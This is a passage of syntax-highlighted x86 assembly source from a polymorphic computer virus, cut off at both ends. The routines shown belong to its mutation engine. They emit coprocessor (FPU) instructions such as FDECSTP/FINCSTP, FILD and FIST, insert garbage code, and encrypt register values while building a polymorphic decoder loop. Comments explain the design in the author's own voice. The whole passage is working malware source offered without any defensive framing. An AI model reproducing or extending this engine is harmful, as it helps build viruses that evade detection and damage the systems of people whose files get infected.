        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_process</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">__cs_finish</span><span class="sc0">

    </span><span class="sc5">__cs_xchg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cs_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C8D9h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc5">__cs_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__copro_reset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_mode</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc1">; is it FXCH ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__csr_decinc</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cs_xchg</span><span class="sc0">
    </span><span class="sc5">__csr_decinc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_reg_count</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_decinc</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_decinc</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_process</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cs_finish</span><span class="sc0">

        </span><span class="sc1">; internal function, don't call it</span><span class="sc0">
</span><span class="sc5">__copro_process</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__csp_finish</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_decinc</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__csp_dec</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_mode</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__csp_decokay</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__csp_decokay</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0000F6D9h</span><span class="sc0">       </span><span class="sc1">;FDECSTP</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__csp_inc</span><span class="sc0">
    </span><span class="sc5">__csp_dec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_mode</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__csp_incokay</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__csp_incokay</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0000F7D9h</span><span class="sc0">       </span><span class="sc1">;FINCSTP</span><span class="sc0">
    </span><span class="sc5">__csp_inc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_reg_count</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;I must generate garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">   </span><span class="sc1">;and between them I must</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;put FDECSTP or FINCSTP</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;instruction and generate</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">   </span><span class="sc1">;garbage again - wow !</span><span class="sc0">

        </span><span class="sc1">; generate DEC reg32 + JNZ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_reg_count</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; get come-back offset</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;you're swine!</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;JNZ's six bytes - ID func</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc5">__csp_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function for mov base-reg to copro-reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can generate a code which move a base-reg</span><span class="sc0">
        </span><span class="sc1">;to a copro-reg using memory like a buffer.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:     AH = base-reg</span><span class="sc0">
        </span><span class="sc1">;       AL = copro-reg</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__cr2m_regs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__copro_reg2mov</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cr2m_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">; where we're in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cr2m_finish</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cr2m_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; choose a place in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_get_mem</span><span class="sc0">
    </span><span class="sc5">__cr2m_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cr2m_new_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cr2m_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; base-reg is in memory, I don't need it...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; FILD dword ptr instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cr2m_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_movin</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_copro_movin</span><span class="sc0">

        </span><span class="sc1">; enable register</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">

    </span><span class="sc5">__cr2m_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function for mov copro-reg to base-reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can generate a code which we moved the cer-</span><span class="sc0">
        </span><span class="sc1">;tain copro-reg to base-reg. Here I use g_copro_movout</span><span class="sc0">
        </span><span class="sc1">;function.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  * the first I must move copro-reg (which I want) to ST(0)</span><span class="sc0">
        </span><span class="sc1">;    by __copro_set function</span><span class="sc0">
        </span><span class="sc1">;  * Read a value from ST(0) and write to defined place in</span><span class="sc0">
        </span><span class="sc1">;    memory by g_copro_movout function</span><span class="sc0">
        </span><span class="sc1">;  * And put the value from mem to base-reg</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:     AH = base-reg</span><span class="sc0">
        </span><span class="sc1">;       AL = copro-reg</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__cm2r_regs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__copro_mov2reg</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm2r_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; disable input register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm2r_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">; where we're in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cm2r_finish</span><span class="sc0">

        </span><span class="sc1">; FIST dword ptr instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm2r_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_movout</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_copro_movout</span><span class="sc0">      </span><span class="sc1">;get value to mem (EAX=place)</span><span class="sc0">

        </span><span class="sc1">;get empty base-reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">__cm2r_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cm2r_new_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">;get value from mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cm2r_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

     </span><span class="sc5">__cm2r_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to calculate a free place in mem (only copro) ÃÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

           </span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
           </span><span class="sc1">;This function returns offset in poly-decode loop which</span><span class="sc0">
           </span><span class="sc1">;it's unnecessary yet. It's a free place when my functions</span><span class="sc0">
           </span><span class="sc1">;save some value to fill base-regs (from copro-regs).</span><span class="sc0">
           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__copro_get_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_back</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__copro_gm_ledi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__copro_gm_okay</span><span class="sc0">
